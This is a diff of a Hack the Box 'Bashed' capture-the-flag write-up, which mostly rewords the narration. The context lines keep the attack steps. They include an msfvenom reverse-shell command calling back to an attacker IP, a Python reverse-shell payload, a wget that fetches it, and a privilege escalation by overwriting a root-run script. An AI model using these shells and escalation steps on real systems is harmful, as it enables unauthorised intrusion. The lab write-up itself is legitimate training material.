@@ -5,6 +5,8 @@ tags:
   - HTB
   - CTF
 ---
+# Hack the Box - Bashed
+
 ### Summary
 This was a pretty quick box, but for some reason, I always find boxes where you hijack an admin script running via root's cron fun to try. There are so many fun tricks to get a shell. A great list of reverse shells is here:
 
@@ -83,7 +85,7 @@ ________________________________________________
 
 ### Exploitation
 
-Visiting http://10.10.10.68/dev/phpbash.php, We are now the www-data user.
+Visiting http://10.10.10.68/dev/phpbash.php, I'm now the www-data user.
 
 ```bash
 www-data@bashed
@@ -180,7 +182,7 @@ scriptmanager:x:1001:1001:,,,:/home/scriptmanager:/bin/bash
 
 ```
 
-Since this is a php shell, and non-interactive, we should create a more comfortable shell to get to work.
+Since this is a php shell, and non-interactive, I want a more comfortable shell work with.
 
 ```bash
 root@kali:/home/kali/htb/bashed# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.2 LPORT=443 -f elf -o shell
@@ -242,7 +244,7 @@ d????????? ? ? ? ?            ? ..
 
 ```
 
-Something seems to be really screwed up with permissions on these files. I try to cat the files but get a permission denied. Enumerating further, I notice www-data can run commands as scriptmanager.
+I try to cat the files but get a permission denied. Enumerating further, I notice www-data can run commands as scriptmanager.
 
 ```bash
 $ sudo -l
@@ -268,7 +270,7 @@ drwxr-xr-x 23 root          root          4.0K Dec  4  2017 ..
 
 ```
 
-The files are now readable. Also the test.txt file is owned by root, which is interesting. I look through the cron jobs but don't actually see a cronjob for this script. Something is executing this python script as root.
+The files are now readable. I noticed the test.txt file is owned by root. It appears root is actually user executing the script.
 
 ```bash
 scriptmanager@bashed:/var/tmp$ cat /scripts/test.py
@@ -281,7 +283,7 @@ testing 123!
 
 ```
 
-What if we change the python script to create a shell instead? I take some python code from PayloadsAllTheThings and tweak it a bit.
+All I need to do now is modify the script to run code for a reverse shell. I take some python from PayloadsAllTheThings and tweak it a bit.
 
 [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python)
 
@@ -296,7 +298,7 @@ pty.spawn("/bin/bash")
 
 ```
 
-Then I serve it up via a smbserver.py and overwrite the test.py file.
+I save this to a file on my kali machine, then I serve it up via a smbserver.py and overwrite the test.py file.
 
 ```bash
 scriptmanager@bashed:/scripts$ wget http://10.10.14.2/shell.py
@@ -325,7 +327,7 @@ The web shell gave me a low-privilege shell, and chance to escalate privileges. 
 
 Then, an admin script was running as root, but a low-privilege user was allowed to edit the script via sudo privileges. 
 
-Ideally, any service accounts such as www-data should have privileges confined to just the files and services they need to access, and sudo permissions should be restricted. 
+Ideally, any service accounts such as www-data should have privileges confined to just the files and services they need to access, and sudo permissions should be restricted. Theoretically, a web service user shouldn't even need write permissions to most things unless the web app is saving files.
 
 ### Offensive Lessons Learned
 Always check sudo -l, and keep your eyes open for any lazy admin scripts that might be available to hijack.
